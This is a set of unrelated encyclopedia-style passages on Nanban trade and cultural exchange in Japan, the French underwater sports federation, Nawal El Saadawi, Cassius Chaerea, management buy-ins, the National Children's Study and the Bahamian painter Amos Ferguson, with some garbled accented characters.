century, Kyushu National Museum Nonetheless, numerous other items were also transactioned, such as gold, Chinese porcelain, musk, and rhubarb; Arabian horses, Bengal tigers and peacocks; fine Indian scarlet cloths, calico and cintz; European manufactured items such as Flemish clocks and Venetian glass and Portuguese wine and rapiers; in return for Japanese copper, lacquer and lacquerware or weapons (as purely exotic items to be displayed in Europe). Japanese lacquerware attracted missionaries from Europe, and western style chests and church furniture were exported in response to their requests. Japanese captured in battle were also sold by their compatriots to the Portuguese as slaves, but the Japanese would also sell family members they could not afford to sustain because of the civil-war. According to prof. Boxer, both old and modern Asian authors have \\"conveniently overlooked\\" their part in the enslavement of their countrymen. They were well regarded for their skills and warlike character, and some ended as far as India and even Europe, some armed retainers or as concubines or slaves to other slaves of the Portuguese. In 1571, King Sebastian of Portugal issued a ban on the enslavement of both Chinese and Japanese, probably fearing the negative effects it might have on proselytization efforts as well as the standing diplomacy between the countries. The shogun of Japan Toyotomi Hideyoshi enforced the end of the enslavement of his countrymen starting in 1587 and it was suppressed shortly thereafter. However, Hideyoshi later sold Korean prisoners of war captured during the Japanese invasions of Korea (1592-1598) as slaves to the Portuguese. The overall profits from the Japan trade, carried on through the black ship, was estimated to ascend to over 600,000 cruzados, according to various contemporary authors such as Diogo do Couto, Jan Huygen van Linschoten and William Adams. A captain-major who invested at Goa 20,000 cruzados to this venture could expect 150,000 cruzados in profits upon returning. The value of Portuguese exports from Nagasaki during the 16th century were estimated to ascend to over 1,000,000 cruzados, reaching as many as 3,000,000 in 1637. The Dutch estimated this was the equivalent of some 6,100,000 guilders, almost as much as the entire founding capital of the Dutch East India Company (VOC) (6,500,000 guilders). VOC profits in all of Asia amounted to \\"just\\" about 1,200,000 guilders, all its assets worth 9,500,000 guilders. After 1592, Portuguese trade was challenged by Japanese Red Seal Ships, Spanish ships from Manila after 1600 (until 1620), the Dutch after 1609 and the English in 1613 (until 1623). Nonetheless, it was found that neither the Dutch nor the Spanish could effectively replace the Portuguese, due to the latter's privileged access to Chinese markets and investors through Macau. The Portuguese were only definitively banned in 1638 after the Shimabara Rebellion, on the grounds that they smuggled priests into Japan aboard their vessels.  Dutch trade  The Dutch, who, rather than \\"Nanban\\" were called \\"K≈çm≈ç\\" (Jp: Á¥ÖÊØõ, lit. \\"Red Hair\\") by the Japanese, first arrived in Japan in 1600, on board the Liefde (\\"liefde\\" meaning \\"love\\"). Their pilot was William Adams, the first Englishman to reach Japan. In 1605, two of the Liefde's crew were sent to Pattani by Tokugawa Ieyasu, to invite Dutch trade to Japan. The head of the Pattani Dutch trading post, Victor Sprinckel, refused on the ground that he was too busy dealing with Portuguese opposition in Southeast Asia. In 1609 however, the Dutchman Jacques Specx arrived with two ships in Hirado, and through Adams obtained trading privileges from Ieyasu. The Dutch also engaged in piracy and naval combat to weaken Portuguese and Spanish shipping in the Pacific, and ultimately became the only westerners to be allowed access to Japan from the small enclave of Dejima after 1638 and for the next two centuries. Red seal trade in the early 17th century.  Technological and cultural exchanges  The Japanese were introduced to several new technologies and cultural practices (so were the Europeans to Japanese, see Japonism), whether in the military area (the arquebus, European- style cuirasses, European ships), religion (Christianity), decorative art, language (integration to Japanese of a Western vocabulary) and culinary: the Portuguese introduced the tempura and above all the valuable refined sugar, creating , \\"southern barbarian confectionery\\", with confectioneries like castella, konpeit≈ç, aruheit≈ç, karumera, keiran s≈çmen, b≈çro and bisukauto. = Tanegashima guns= Tanegashima gun Japanese arquebus of the Edo era (Tanegasima). The Japanese were interested in Portuguese hand-held guns. The first two Europeans to reach Japan in the year 1543 were the Portuguese traders Ant√≥nio da Mota and Francisco Zeimoto (Fern√£o Mendes Pinto claimed to have arrived on this ship as well, but this is in direct conflict with other data he presents), arriving on a Chinese ship at the southern island of Tanegashima where they introduced hand-held guns for trade. The Japanese were already familiar with gunpowder weaponry (invented by, and transmitted from China), and had been using basic Chinese originated guns and cannon tubes called \\"Tepp≈ç\\" (ÈâÑÁ†≤ \\"Iron cannon\\") for around 270 years before the arrival of the Portuguese. In comparison, the Portuguese guns were light, had a matchlock firing mechanism, and were easy to aim. Because the Portuguese-made firearms were introduced into Tanegashima, the arquebus was ultimately called Tanegashima in Japan. At that time, Japan was in the middle of a civil war called the Sengoku period (Warring States period). Within a year after the first trade in guns, Japanese swordsmiths and ironsmiths managed to reproduce the matchlock mechanism and mass-produce the Portuguese guns. Barely fifty years later, \\"by the end of the 16th century, guns were almost certainly more common in Japan than in any other country in the world\\", its armies equipped with a number of guns dwarfing any contemporary army in Europe (Perrin). The guns were strongly instrumental in the unification of Japan under Toyotomi Hideyoshi and Tokugawa Ieyasu, as well as in the invasions of Korea in 1592 and 1597. The daimyo who initiated the unification of Japan, Oda Nobunaga, made extensive use of guns (arquebus) when playing a key role in the Battle of Nagashino, as dramatised in Akira Kurosawa's 1980 film Kagemusha (Shadow Warrior). = Red seal ships = A 1634 Japanese Red seal ship, incorporating Western-style square and lateen sails, rudder and aft designs. The ships were typically armed with 6 to 8 cannons. Tokyo Naval Science Museum. The Japanese- built 1613 galleon San Juan Bautista, in Ishinomaki, Japan (replica). European ships (galleons) were also quite influential in the Japanese shipbuilding industry and actually stimulated many Japanese ventures abroad. The Shogunate established a system of commercial ventures on licensed ships called , which sailed throughout East and Southeast Asia for trade. These ships incorporated many elements of galleon design, such as sails, rudder, and gun disposition. They brought to Southeast Asian ports many Japanese traders and adventurers, who sometimes became quite influential in local affairs, such as the adventurer Yamada Nagamasa in Siam, or later became Japanese popular icons, such as Tenjiku Tokubei. By the beginning of the 17th century, the shogunate had built, usually with the help of foreign experts, several ships of purely Nanban design, such as the galleon San Juan Bautista, which crossed the Pacific two times on embassies to Nueva Espa√±a (Mexico). = Catholicism in Japan = Bell of Nanbanji, made in Portugal for Nanbanji Church, established by Jesuits in 1576 and destroyed 1587, Japan Portrait of Oda Nobunaga, by Jesuit painter Giovanni Niccolo, 1583‚Äì1590. With the arrival of the leading Jesuit Francis Xavier in 1549, Catholicism progressively developed as a major religious force in Japan. Although the tolerance of Western \\"padres\\" was initially linked to trade, Catholics could claim around 200,000 converts by the end of the 16th century, mainly located in the southern island of Ky≈´sh≈´. The Jesuits managed to obtain jurisdiction over the trading city of Nagasaki. The first reaction from the kampaku Hideyoshi came in 1587 when he promulgated the interdiction of Christianity and ordered the departure of all \\"padres\\". This resolution was not followed upon however (only 3 out of 130 Jesuits left Japan), and the Jesuits were essentially able to pursue their activities. Hideyoshi had written that :\\"1. Japan is a country of the Gods, and for the padres to come hither and preach a devilish law, is a reprehensible and devilish thing ... :2. For the padres to come to Japan and convert people to their creed, destroying Shinto and Buddhist temples to this end, is a hitherto unseen and unheard-of thing ... to stir the canaille to commit outrages of this sort is something deserving of severe punishment.\\" (From Boxer, The Christian Century in Japan) Hideyoshi's reaction to Christianity proved stronger when the Spanish galleon San Felipe was wrecked in Japan in 1597. The incident led to twenty-six Christians (6 Franciscans, 17 of their Japanese neophytes, and 3 Japanese Jesuit lay brothers ‚Äì included by mistake) being crucified in Nagasaki on February 5, 1597. It seems Hideyoshi's decision was taken following encouragements by the Jesuits to expel the rival order, his being informed by the Spanish that military conquest usually followed Catholic proselytism, and by his own desire to take over the cargo of the ship. Although close to a hundred churches were destroyed, most of the Jesuits remained in Japan. The final blow came with Tokugawa Ieyasu's firm interdiction of Christianity in 1614, which led to underground activities by the Jesuits and to their participation in Hideyori's revolt in the Siege of Osaka (1614‚Äì15). Repression of Catholicism became virulent after Ieyasu's death in 1616, leading to the torturing and killing of around 2,000 Christians (70 westerners and the rest Japanese) and the apostasy of the remaining 200‚Äì300,000. The last major reaction of the Christians in Japan was the Shimabara rebellion in 1637. Thereafter, Catholicism in Japan was driven underground as the so-called \\"Hidden Christians\\". = Other Nanban influences = The Nanban also had various other influences: * Nanband≈ç (ÂçóËõÆËÉ¥) designates a type of cuirass covering the trunk in one piece, a design imported from Europe. * Nanbanbijutsu (ÂçóËõÆÁæéË°ì) generally describes Japanese art with Nanban themes or influenced by Nanban designs(See Nanban art). * Nanbanga (ÂçóËõÆÁîª) designates the numerous pictorial representations that were made of the new foreigners and defines a whole style category in Japanese art (See Namban art and an example at: or ) * Nanbannuri (ÂçóËõÆÂ°ó„Çä) describes lacquers decorated in the Portuguese style, which were very popular items from the late 16th century (See example at: ). * Nanbangashi (ÂçóËõÆËèìÂ≠ê) is a variety of sweets derived from Portuguese or Spanish recipes. The most popular sweets are \\"Kasutera\\" („Ç´„Çπ„ÉÜ„É©), named after Castile, and \\"Konpeit≈ç\\" (ÈáëÂπ≥Á≥ñ „Åì„Çì„Å∫„ÅÑ„Å®„ÅÜ), from the Portuguese word \\"confeito\\" (\\"sugar candy\\"), and \\"Biscuit\\"(„Éì„Çπ„Ç±„ÉÉ„Éà), etc. These \\"Southern barbarian\\" sweets are on sale in many Japanese supermarkets today. * was the first Christian church in Kyoto. With support from Oda Nobunaga, the Jesuit Padre Gnecchi- Soldo Organtino established this church in 1576. Eleven years later (1587), Nanbanji was destroyed by Toyotomi Hideyoshi. Currently, The bell is preserved as \\"Nanbanji-no-kane\\" (the Bell of Nanbanji) at Shunkoin temple in Kyoto.Shunkoin Temple Decline of Nanban exchanges After the country was pacified and unified by Tokugawa Ieyasu in 1603 however, Japan progressively closed itself to the outside world, mainly because of the rise of Christianity. By 1650, except for the trade outpost of Dejima in Nagasaki, for the Netherlands, and some trade with China, foreigners were subject to the death penalty, and Christian converts were persecuted. Guns were almost completely eradicated to revert to the more \\"civilized\\" sword. Travel abroad and the building of large ships were also prohibited. Thence started a period of seclusion, peace, prosperity and mild progress known as the Edo period. But not long after, in the 1650s, the production of Japanese export porcelain increased greatly when civil war put the main Chinese center of porcelain production, in Jingdezhen, out of action for several decades. For the rest of the 17th century most Japanese porcelain production was in Kyushu for export through the Chinese and Dutch. The trade dwindled under renewed Chinese competition by the 1740s, before resuming after the opening of Japan in the 1850s.Battie, David, ed., Sotheby's Concise Encyclopedia of Porcelain, pp. 71-78, 1990, Conran Octopus. The \\"barbarians\\" would come back 250 years later, strengthened by industrialization, and end Japan's isolation with the forcible opening of Japan to trade by an American military fleet under the command of Commodore Matthew Perry in 1854.  Usages of the word \\"Nanban\\"  Nanband≈ç, a western-style cuirass, 16th century. Japanese inro depicting Nanban foreigners, 17th century. Nanban is a Sino-Japanese word derived from the Chinese term N√°nm√°n, originally referring to the peoples of South Asia and Southeast Asia. The Japanese use of Nanban took a new meaning when it came to designate the early Portuguese who first arrived in 1543, and later extended to other Europeans that arrived in Japan. The term Nanban has its origins from the Four Barbarians in the Hua‚ÄìYi distinction in the 3rd century in China. Pronunciation of the Chinese Character is Japanised, the Êù±Â§∑ (D≈çngy√≠) \\"Eastern Barbarians\\" called \\"T≈çi\\" (it includes Japan itself), ÂçóËõÆ (N√°nm√°n) \\"Southern Barbarians\\" called \\"Nanban\\", Ë•øÊàé (Xƒ´r√≥ng) \\"Western Barbarians\\" called \\"Sei-J≈´\\", and Bƒõid√≠ ÂåóÁãÑ \\"Northern Barbarians\\" called \\"Hoku-Teki\\". Although Nanban just meant Southeast Asia during the Sengoku and Edo periods, through time the word turned into the meaning \\"Western person\\", and \\"from Nanban\\" means \\"Exotic and Curious\\". Strictly speaking, Nanban means \\"Portuguese or Spanish\\" who were the most popular western foreigners in Japan, while other western people were sometimes called \\"Á¥ÖÊØõ‰∫∫\\" (K≈ç-m≈çjin) \\"red-haired people\\" but K≈ç-m≈çjin was not as widespread as Nanban. In China, \\"Á¥ÖÊØõ\\" is pronounced Ang mo in Hokkien and is a racial slur against white people. Japan later decided to Westernize radically in order to better resist the West and essentially stopped considering the West as fundamentally uncivilized. Words like \\"Y≈çfu\\" (Ê¥ãÈ¢® \\"western style\\") and \\"≈åbeifu\\" (Ê¨ßÁ±≥È¢® \\"European-American style)\\" replaced \\"Nanban\\" in most usages. Still, the exact principle of westernization was Wakon-Y≈çsai (ÂíåÈ≠ÇÊ¥ãÊâç \\"Japanese spirit Western talent\\"), implying that, although technology may be more advanced in the West, Japanese spirit is better than the West's. Hence though the West may be lacking, it has its strong points, which takes the affront out of calling it \\"barbarian.\\" Today the word \\"Nanban\\" is only used in a historical context, and is essentially felt as picturesque and affectionate. It can sometimes be used jokingly to refer to Western people or civilization in a cultured manner. There is an area where Nanban is used exclusively to refer to a certain style and that is cooking and the names of dishes. Nanban dishes are not American or European, but an odd variety not using soy sauce or miso but rather curry powder and vinegar as their flavoring, a characteristic derived from Indo-Portuguese Goan cuisine. This is because when Portuguese and Spanish dishes were imported into Japan, dishes from Macau and other parts of China were imported as well.

Origins and history  In 1948, the organisation was created under the title, F√©d√©ration des soci√©t√©s de p√™che √† la nage et d‚Äô√©tudes sous-marines (FSPNES) (federation of societies for underwater fishing and swimming). In 1952, FSPNES became the F√©d√©ration des groupements r√©gionaux de sports sous-marins (FGRSSM) (federation of regional groupings of underwater sports). In 1953, FGRSSM became the F√©d√©ration fran√ßaise des activit√©s sous-marines (FFASM) (French federation of underwater activities). In 1954, FFASM changed its name to the F√©d√©ration nationale fran√ßaise d‚Äô√©tudes et de sports sous-marins (FNFESSM) (French national federation of underwater studies and sports) in order to avoid confusion with FASM, a rival organisation with a similar name. In 1955, FNFESSM and FASM merged to become FFESSM (French federation of underwater studies and sports). Underwater sport FFESSM supports competition at all levels for the following underwater sports: finswimming, freediving, spearfishing, underwater hockey, cave diving, underwater orienteering and underwater target shooting. It also offers competition in canyoning.

She has been awarded honorary degrees on three continents. In 2004, she won the North‚ÄìSouth Prize from the Council of Europe. In 2005, she won the Inana International Prize in Belgium,\\"PEN World Voices Arthur Miller Freedom to Write Lecture by Nawal El Saadawi\\", YouTube. 8 September 2009. and in 2012, the International Peace Bureau awarded her the 2012 Se√°n MacBride Peace Prize. Nawal el Saadawi has held the positions of Author for the Supreme Council for Arts and Social Sciences, Cairo; Director General of the Health Education Department, Ministry of Health, Cairo, Secretary General of the Medical Association, Cairo, Egypt, and medical doctor at the University Hospital and Ministry of Health. She is the founder of the Health Education Association and the Egyptian Women Writers' Association; she was Chief Editor of Health Magazine in Cairo, and Editor of Medical Association Magazine.  Early life  The second-eldest of nine children, Saadawi was born in 1931 in the small village of Kafr Tahla. Her family was at once traditional and progressive: Saadawi was \\"circumcised\\" (her clitoris cut off) at the age of six, yet her father insisted that all his children be educated. Her father was a government official in the Ministry of Education, who had campaigned against the rule of the British occupation of Egypt and Sudan during the Egyptian Revolution of 1919. As a result, he was exiled to a small town in the Nile Delta, and the government punished him by not promoting him for 10 years. He was relatively progressive and taught his daughter self- respect and to speak her mind. He also encouraged her to study the Arabic language. Both her parents died at a young age, leaving Saadawi with the sole burden of providing for a large family. Her mother was from a family of Turkish origin; Saadawi has described her grandfather, Shoukry Bey, and his family as \\"all of whom had the fair skin of the Turks\\". Her maternal grandmother was also of Turkish origin.  Career  Saadawi graduated as a medical doctor in 1955 from Cairo University. That year, she married Ahmed Helmi, whom she met as a fellow student in medical school. They have a daughter, Mona Helmi. The marriage ended after two years. Through her medical practice, she observed women's physical and psychological problems and connected them with oppressive cultural practices, patriarchal oppression, class oppression and imperialist oppression.Feminism in a nationalist century Her second husband was a colleague, Rashad Bey. While working as a doctor in her birthplace of Kafr Tahla, she observed the hardships and inequalities faced by rural women. After attempting to protect one of her patients from domestic violence, Saadawi was summoned back to Cairo. She eventually became the Director of the Ministry of Public Health and met her third husband, Sherif Hatata, while sharing an office in the Ministry of Health. Hatata, also a medical doctor and writer, had been a political prisoner for 13 years. They married in 1964 and have a son. Saadawi and Hatata lived together for 43 years and divorced in 2010. In 1972, she published Woman and Sex (), confronting and contextualising various aggressions perpetrated against women's bodies, including female circumcision. The book became a foundational text of second- wave feminism. As a consequence of the book and her political activities, Saadawi was dismissed from her position at the Ministry of Health. She also lost her positions as chief editor of a health journal, and as Assistant General Secretary in the Medical Association in Egypt. From 1973 to 1976, Saadawi worked on researching women and neurosis in Ain Shams University's Faculty of Medicine. From 1979 to 1980, she was the United Nations Advisor for the Women's Programme in Africa (ECA) and the Middle East (ECWA). = Imprisonment = Long viewed as controversial and dangerous by the Egyptian government, Saadawi helped publish a feminist magazine in 1981 called Confrontation. She was imprisoned in September by President of Egypt Anwar Sadat. Saadawi stated once in an interview, \\"I was arrested because I believed Sadat. He said there is democracy and we have a multi-party system and you can criticize. So I started criticizing his policy and I landed in jail\\". Sadat claimed that the established government was a democracy for the people and that democracy as always was open for constructive criticism. According to el Saadawi, Sadat imprisoned her because of her criticism of his purported democracy. Even in prison she still found a way to fight against the oppression of women. While in prison she formed the Arab Women's Solidarity Association. This was the first legal and independent feminist group of Egypt. In prison she was denied pen and paper, However that did not stop her from continuing to write. She used a \\"stubby black eyebrow pencil\\" and \\"a small roll of old and tattered toilet paper\\" to record her thoughts. She was released later that year, one month after the President's assassination. Of her experience she wrote: \\"Danger has been a part of my life ever since I picked up a pen and wrote. Nothing is more perilous than truth in a world that lies.\\" In 1982, she founded the Arab Women Solidarity Association.Sierra Hussey, \\"Biography of Nawal El Saadawi\\", South African History Online. Saadawi was one of the women held at Qanatir Women's Prison. Her incarceration formed the basis for her memoir, Memoirs from the Women's Prison ( , 1983). Her contact with a prisoner at Qanatir, nine years before she was imprisoned there, served as inspiration for an earlier work, a novel titled Woman at Point Zero (, 1975). = Further persecution, teaching in the US, and on-going activism = In 1988, when her life was threatened by Islamists and political persecution, Saadawi was forced to flee Egypt. She accepted an offer to teach at Duke University's Asian and African Languages Department in North Carolina, as well as at the University of Washington. She has since held positions at a number of prestigious colleges and universities including Cairo University, Harvard, Yale, Columbia, the Sorbonne, Georgetown, Florida State University, and the University of California, Berkeley. In 1996, she moved back to Egypt.Dr Dora Carpenter-Latiri, \\"The Reading Room: A review of ‚ÄòMemoirs of a woman doctor‚Äô\\", BMJ Blog, 11 November 2015.Jessica Ling, \\"Today in History: Happy 85th Birthday, Nawal El Saadawi!\\", Warscapes, 27 October 2016. Saadawi has continued her activism and considered running in the 2005 Egyptian presidential election, before stepping out because of stringent requirements for first-time candidates.\\"Egypt presidential aspirant pulls out\\", AlJazeera, 16 July 2005. She was among the protesters in Tahrir Square in 2011.Elizabeth Rubin, \\"The Feminists in the Middle of Tahrir Square\\", Newsweek, 6 March 2011. She has called for the abolition of religious instruction in the Egyptian schools. Saadawi was awarded the 2004 North‚ÄìSouth Prize by the Council of Europe. In July 2016, she headlined the Royal African Society's \\"Africa Writes\\" literary festival in London, where she spoke \\"On Being A Woman Writer\\" in conversation with Margaret Busby.Kelechi Iwumene, \\"Africa Writes 2016: The Round-Up\\".\\"On Being A Woman Writer: Nawal El Saadawi in conversation\\", Africa Writes, 2 July 2016. She was in G√∂teborg Book Fair, which took place on 27 to 30 September 2018, where she attended a seminar on development in Egypt and the Middle East after the Arab Spring and stated, during her talk, in the event that \\"colonial, capitalist, imperialist, racist\\" global powers, led by the United States, collaborated with the Egyptian government to end the 2011 Egyptian revolution. She added that she remembered seeing then-U.S. Secretary of State Hillary Clinton in Tahrir Square handing out dollar bills to the youth in order to encourage them to vote for the Muslim Brotherhood in the upcoming elections.\\"Egyptian Women's Rights Activist Nawal El Saadawi: I Saw Hillary Clinton Handing Out U.S. Dollars In Tahrir Square So That People Would Vote For the Muslim Brotherhood\\", Memri TV, 30 September 2018.  Writing  Saadawi began writing early in her career. Her earliest writings include a selection of short stories entitled I Learned Love (1957) and her first novel, Memoirs of a Woman Doctor (1958). She has since written numerous novels and short stories and a personal memoir, Memoir from the Women's Prison (1986). Saadawi has been published in a number of anthologies, and her work has been translated from the original Arabic into more than 30 languages,Judith Imel Van Allen, \\"Saadawi, Nawal El (1931‚Äì)\\", in Gary L. Anderson and Kathryn G. Herr (eds), Encyclopedia of Activism and Social Justice, Sage Publications, 2007, pp. 1249‚Äì1250. including English, French, German, Spanish, Portuguese, Swedish, Norwegian, Danish, Italian, Dutch, Finnish, Indonesian, Japanese, Persian, Turkish, Urdu and others. In 1972, she published her first work of non-fiction, Women and Sex, which evoked the antagonism of highly placed political and theological authorities. It also led to her dismissal at the Ministry of Health. Other works include The Hidden Face of Eve, God Dies by the Nile, The Circling Song, Searching, The Fall of the ImamPhilip Womack. \\"The Fall of the Imam by Nawal El Saadawi\\" (review), New Humanist, 20 August 2009. and Woman at Point Zero. She contributed the piece \\"When a woman rebels\\" to the 1984 anthology Sisterhood Is Global, edited by Robin Morgan, and is a contributor to the 2019 anthology New Daughters of Africa, edited by Margaret Busby.Imani Perry, \\"New Daughters of Africa ‚Äî a new anthology of a groundbreaking book\\", Financial Times, 29 March 2019.Johnna Rocker-Clinton, \\"Margaret Busby does it again!\\", review of New Daughters of Africa: An International Anthology of Writing by Women of African Descent, San Francisco Book Review, August 2019. Saadawi's novel Zeina was published in Lebanon in 2009. The French translation was published under the pseudonym Nawal Zeinab el Sayed, using her mother's maiden name. Saadawi speaks fluent English in addition to her native Egyptian Arabic.Hans Ulrich Obrist, \\"In Conversation with Nawal El Saadawi\\", e-flux Journal #42, February 2013. As she writes in Arabic, she sees the question of translation into English or French as \\"a big problem\\" linked to the fact that > \\"the colonial capitalist powers are mainly English- or French-speaking.... I > am still ignored by big literary powers in the world, because I write in > Arabic, and also because I am critical of the colonial, capitalist, racist, > patriarchal mind set of the super-powers.\\"Dele Meiji Fatunla, \\"Nawal El > Saadawi: 'My identity is not fixed'\\", New African, 30 June 2016. Her book Mufakirat Tifla fi Al-Khamisa wa Al-Thamaneen (A Notebook of an 85-year-old Girl), based on excerpts from her journal, was published in 2017.Mahmoud El-Wardani, \\"At 85, Nawal El-Saadawi writes about Nawal El- Saadawi\\", Ahram Online, 5 August 2017.  Views  =Advocacy against genital mutilation= At a young age, Saadawi underwent the process of female genital mutilation.Nawal el-Saadawi, The Hidden Face of Eve, Part 1: The Mutilated Half. As an adult, she has written about and criticized this practice. She responded to the death of a 12-year-old girl, Bedour Shaker, during a genital circumcision operation in 2007 by writing: \\"Bedour, did you have to die for some light to shine in the dark minds? Did you have to pay with your dear life a price ... for doctors and clerics to learn that the right religion doesn't cut children's organs.\\"Maggie Michael, \\"Egypt Officials Ban Female Circumcision\\" , Phys.org, 30 June 2007. As a doctor and human rights activist, Saadawi is also opposed to male circumcision. She believes that both male and female children deserve protection from genital mutilation. =Religion= In a 2014 interview, Saadawi said that \\"the root of the oppression of women lies in the global post-modern capitalist system, which is supported by religious fundamentalism\\". When hundreds of people were killed in what has been called a \\"stampede\\" during the 2015 pilgrimage (Hajj) of Muslims to Mecca, Saudi Arabia, she said: > \\"They talk about changing the way the Hajj is administered, about making > people travel in smaller groups. What they don‚Äôt say is that the crush > happened because these people were fighting to stone the devil. Why do they > need to stone the devil? Why do they need to kiss that black stone? But no > one will say this. The media will not print it. What is it about, this > reluctance to criticize religion? ... This refusal to criticize religion ... > is not liberalism. This is censorship.\\" She has said that elements of the Hajj, such as kissing the Black Stone, had pre-Islamic pagan roots.Fiona Lloyd-Davies, \\"No compromise\\", Correspondent, BBC News, 26 October 2001. Saadawi has been involved in the academic exploration of Arab identity throughout her writing career. Veiling Saadawi describes the Islamic veil as \\"a tool of oppression of women\\". She is also critical about the objectification of women and female bodies without male bodies in patriarchal social structures common in Europe and the US. =United States= In a 2002 lecture at the University of California, Saadawi described the US-led war on Afghanistan as \\"a war to exploit the oil in the region\\", and US foreign policy and its support of Israel as \\"real terrorism\\". Saadawi has opined that Egyptians are forced into poverty by US aid.

According to Tacitus, before Chaerea's service in the Praetorians, he distinguished himself with his bravery and skill in helping to subdue the mutiny on the Germanic frontier immediately after the death of Augustus in AD 14. Chaerea was disturbed by the increasingly unbalanced Caligula, and was angered at the Emperor's mocking of his voice and of his supposed or real effeminacy. Suetonius reported that whenever Caligula had Chaerea kiss his ring, Caligula would \\"hold out his hand to kiss, forming and moving it in an obscene fashion\\". Chaerea was also made to use degrading watch-words at night, including \\"Venus\\" (slang for a male eunuch) and \\"Priapus\\" (erection). Unable to bear this deliberate provocation any longer, Chaerea planned to assassinate Caligula during the Palatine games held in January 41. Caligula was despised by many people and Chaerea's plot was one of several that formed around the same time, eventually coalescing into one broad conspiracy involving a number of Praetorians, Senators, and Equestrians. On January 24 Chaerea struck, and Caligula was stabbed to death. At the same time, Caligula's wife Caesonia and daughter Julia Drusilla were murdered, completing the task of destroying the emperor's immediate family. Chaerea was sympathetic to his fellow conspirators in the Senate, and sought the destruction of the Principate. But Chaerea did not control the loyalty of the majority of the Praetorians, who quickly proclaimed Caligula's uncle, Claudius, as emperor. Shortly afterwards, Chaerea was sentenced to death, one of the few assassins to be actually condemned. Chaerea requested to be executed with his personal sword, and this boon was granted. In fiction Cassius Chaerea is portrayed sympathetically in Robert Graves' I, Claudius novels as having had a long and distinguished career in service of Rome, including being the only surviving officer of the massacre at Teutoburg Forest. He later serves under Caligula, whom he protected in his youth. Chaerea insists that he killed Caligula for the Republic's sake, and Claudius sympathizes with him. Chaerea is foretold in the Sibyl's prophecy to be \\"the horse\\" that will kill Caligula, as Caligula rode on Chaerea's shoulders as a child. As he did in fact according to Suetonius, the new Emperor Claudius decides he must have Cassius Chaerea executed, not so much for the murder of the insane Caligula, but for ordering the murder of Caligula's wife and infant child. In the 1976 BBC TV series I, Claudius, Cassius Chaerea was portrayed by Sam Dastor. In the 1979 theatrical film Caligula, he was portrayed by Paolo Bonacelli.

A management buy-in team often competes with other purchasers in the search for a suitable business. Usually, the team will be led by a manager with significant experience at managing director level. The difference to a management buy-out is in the position of the purchaser: in the case of a buy-out, they are already working for the company. In the case of a buy-in, however, the manager or management team is from another source. Buy- in management buyout (BIMBO) A buy-in management buyout is a combination of a management buy-in and a management buyout. In the case of a buy-in management buy-out, the team that buy out the company are a combination of existing managers, who retain a stake in the company, and individuals from outside the company who will join the management team following the buy-out.

It was intended to measure the many factors that contribute to health and disease from before birth through age 21. This included, but was not limited to, the search for drivers of diseases with prenatal or developmental origins. The Study was closed in December 2014. Organization The NCS was led by the National Institutes of Health, with the Eunice Kennedy Shriver National Institute of Child Health and Human Development (NICHD) serving as the scientific lead. Within NICHD, the NCS Program Office administered the implementation of day-to-day Study operations. The Program Office was supervised by the Study Director, Steven Hirschfeld, MD, PhD Associate Director for Clinical Research, NICHD. For advice and recommendations regarding Study framework, content, and methodologies, the NCS Program Office engaged external advisors and scientific groups. These groups included federal partners such as the NCS Federal Advisory Committee and a Federal Consortium with representatives from multiple federal agencies including: the U.S. Department of Health and Human Services, the National Institute of Environmental Health Sciences of the National Institutes of Health, the Centers for Disease Control and Prevention, and the U.S. Environmental Protection Agency. An independent Study Monitoring and Oversight Committee monitored study progress and participant safety. In addition to these more formal channels, the NCS solicited feedback from subject matter experts from around the world and from individuals, community advocates, and professional societies concerned with child health. The NCS Program Office also provided public forums for input on a variety of initiatives. Congressional Mandate The \\"President‚Äôs Task Force on Health Risks and Safety Risks to Children\\" recommended this federal initiative in 1999, after which Congress passed the Children's Health Act of 2000 (Title X, Section 1004). The Act charged NICHD to: # plan, develop, and implement a prospective cohort study, from birth to adulthood, to evaluate the effects of both chronic and intermittent exposures on child health and human development; and # investigate basic mechanisms of developmental disorders and environmental factors, both risk and protective, that influence health and developmental processes. The Act required this NCS to: # incorporate behavioral, emotional, educational, and contextual consequences to enable a complete assessment of the physical, chemical, biological, and psychosocial environmental influences on children's well- being; # gather data on environmental influences and outcomes on diverse populations of children, which may include the consideration of prenatal exposures; and # consider health disparities among children, which may include the consideration of prenatal exposuresNational Institutes of Health New Proposed Collection; Comment Request; Neuropsychosocial Measures Formative Research Methodology Studies for the National Children's Study Federal Register, vol 76, No. 84, May 2, 2011 Objective The NCS was designed to examine the effects of the environment‚Äîbroadly defined to include factors such as air, water, diet, sound, family dynamics, community, and cultural influences‚Äî and genetics on the growth, development, and health of children across the United States. The NCS was designed to follow approximately 100,000 children, some from before birth, through age 21 years. The NCS planned to collect comprehensive information to: # contribute to improving the health and well-being of all children # deepen our understanding of the contribution of various factors to a range of health and disease outcomes # understand factors that lead to health disparities. With this broad perspective, the NCS was designed to contribute to the implementation of health equity, where each individual has an opportunity to realize their health potential. Discontinued The NCS was in its Vanguard, or pilot phase, which was designed to assess the feasibility, acceptability, cost, and utility of Study scientific output, logistics, and operations prior to initiating the Main Study. The Vanguard Study enrolled about 5,000 children in 40 counties across the United States. General recruitment was completed in July 2013. On December 12, 2014, the National Children's Study closed, after an expert review committee advised the NIH Director that moving forward with the larger Main Study would not be the best way to add to the understanding of how environmental and genetic factors influence child health and development.National Children‚Äôs Study (NCS) Working Group FINAL REPORT ‚Äì DECEMBER 12, 2014 National Institutes of Health, Advisory Committee to the Director, 19 pages The NCS will not collect any new information from participants.

He worked as an upholsterer, furniture finisher, artist and house painter. He died in Nassau on October 19, 2009.  Work  Ferguson was known for his brilliantly colored Bible stories and Bahamian scenes. He did not become an artist until he was in his 40s when, as he told the story, his nephew came to him and related a dream that he had just had. Jesus, the nephew said, came out of the sea with the picture in his hands and said that Mr. Ferguson was wasting his talent in painting. Mr. Ferguson heeded the call and painting with exterior enamel on cardboard, rendered Bible stories or Bahamian stories in Caribbean visual idiom. He began showing at galleries in the Bahamas in 1972. Widespread recognition came to him in 1978 when Sukie Miller, an American collector, bought some of his paintings. His images were later used to illustrate \\"Under the Sunday Tree\\" (1991), a collection of poetry by Eloise Greenfield. Ferguson's official Art Gallery is located in Nassau, Bahamas. He often titled his paintings using poor grammar and misspellings. He always signed his paintings with the phrase \\"Paint by Mr. Amos Ferguson\\". Amos Ferguson wasn't trained as an artist and was known as an outsider artist. He often said \\"I paint by faith, not by sight\\". His paintings, which sell for as much as $45,000, are displayed in galleries in the Bahamas, the United States, and homes, museums, and art galleries around the world.

